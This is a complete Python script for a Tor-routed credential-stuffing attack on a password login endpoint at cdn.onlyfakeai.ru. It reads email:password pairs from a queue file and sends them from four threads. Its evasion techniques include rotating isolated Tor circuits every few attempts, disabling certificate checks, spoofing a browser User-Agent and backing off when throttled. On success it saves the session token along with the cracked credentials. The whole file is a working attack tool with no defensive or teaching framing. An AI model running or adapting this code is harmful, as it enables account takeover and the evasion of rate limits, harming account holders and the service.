#!/usr/bin/env python3
"""Parallel Tor credential trial: 4 workers, SOCKS5-auth-isolated circuits,
reused for PER_CIRCUIT attempts then rotated. Shares resume state with direct channel.
Queue rows: email:password. Result /tmp/brute_result.json. Log /tmp/brute8.log.
"""
import ssl, json, time, os, threading, socket

HOST = "cdn.onlyfakeai.ru"
PATH = "/auth/v1/token?grant_type=password"
APIKEY = "<publishable-key>"
PWFILE = os.environ.get("PWFILE", "/tmp/ops_queue2.txt")
RESULT = "/tmp/brute_result.json"
LOG = os.environ.get("BLOG", "/tmp/brute8.log")
STATE = os.environ.get("BSTATE", "/tmp/brute_state2.txt")
THREADS = int(os.environ.get("THREADS", "4"))
PER_CIRCUIT = int(os.environ.get("PER_CIRCUIT", "8"))

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
stop = threading.Event()
lock = threading.Lock()
idx_lock = threading.Lock()
rows = [l.rstrip("\n") for l in open(PWFILE, encoding="utf-8", errors="ignore") if l.strip()]
next_idx = [0]
counters = {"n": 0, "throttled": 0, "err": 0}
t0 = time.time()


def log(msg):
    with open(LOG, "a", encoding="utf-8") as f:
        f.write(f"{time.strftime('%H:%M:%S')} {msg}\n"); f.flush()


def save_state(i):
    with open(STATE, "w") as f:
        f.write(str(i))


def claim():
    with idx_lock:
        i = next_idx[0]
        if i >= len(rows):
            return None
        next_idx[0] = i + 1
        return i


def open_circuit(username):
    import socks
    s = socks.socksocket()
    s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050, username=username, password="x")
    s.settimeout(30)
    s.connect((HOST, 443))
    return ctx.wrap_socket(s, server_hostname=HOST)


def do_req(ss, email, pw):
    body = json.dumps({"email": email, "password": pw}).encode()
    raw = (f"POST {PATH} HTTP/1.1\r\nHost: {HOST}\r\n"
           "Content-Type: application/json\r\n"
           f"apikey: {APIKEY}\r\n"
           "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0\r\n"
           f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n").encode() + body
    ss.sendall(raw)
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = ss.recv(4096)
        if not chunk: raise ConnectionError("closed")
        buf += chunk
    head, _, rest = buf.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    status = int(lines[0].split()[1])
    clen = None
    for line in lines[1:]:
        if line.lower().startswith(b"content-length:"):
            clen = int(line.split(b":")[1].strip())
    data = rest
    while clen is not None and len(data) < clen:
        chunk = ss.recv(4096)
        if not chunk: break
        data += chunk
    return status, data


def worker(wid):
    ss = None; used = 0; rot = 0
    while not stop.is_set():
        i = claim()
        if i is None:
            break
        email, _, pw = rows[i].partition(":")
        if not email or not pw:
            save_state(i + 1); continue
        while not stop.is_set():
            if ss is None or used >= PER_CIRCUIT:
                try:
                    if ss is not None:
                        try: ss.close()
                        except Exception: pass
                    rot += 1
                    ss = open_circuit(f"p{wid}r{rot}{time.time_ns() % 100000}")
                    used = 0
                except Exception:
                    ss = None
                    with lock: counters["err"] += 1
                    time.sleep(2)
                    continue
            try:
                code, data = do_req(ss, email, pw)
                used += 1
            except Exception:
                with lock: counters["err"] += 1
                try: ss.close()
                except Exception: pass
                ss = None; used = 0
                time.sleep(1)
                continue
            if code == 200:
                try:
                    sess = json.loads(data); sess["_email"] = email; sess["_password"] = pw
                    open(RESULT, "w", encoding="utf-8").write(json.dumps(sess))
                    log(f"SUCCESS email={email} password={pw!r} idx={i}")
                except Exception as e:
                    log(f"200 decode error {e}")
                stop.set(); return
            with lock:
                counters["n"] += 1
                n = counters["n"]
                if n % 10 == 0:
                    rate = n / max(1e-9, time.time() - t0)
                    log(f"{n} tried, {rate:.2f}/s, idx~{i}, counters={counters}")
            if code == 429:
                with lock: counters["throttled"] += 1
                try: ss.close()
                except Exception: pass
                ss = None; used = 0
                time.sleep(2)
                continue
            elif code >= 500:
                with lock: counters["err"] += 1
                time.sleep(2)
                continue
            # 400 invalid creds: done with this row
            with idx_lock:
                if i + 1 > next_idx[0] or True:
                    save_state(i + 1)
            break
    if ss is not None:
        try: ss.close()
        except Exception: pass


def main():
    start = 0
    if os.path.exists(STATE):
        try: start = int(open(STATE).read().strip())
        except Exception: start = 0
    next_idx[0] = start
    log(f"TOR START total={len(rows)} from_idx={start} threads={THREADS}")
    ts = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(THREADS)]
    for t in ts: t.start()
    for t in ts: t.join()
    log(f"TOR DONE counters={counters} elapsed={int(time.time()-t0)}s")


if __name__ == "__main__":
    try: main()
    finally: log("TOR EXIT")

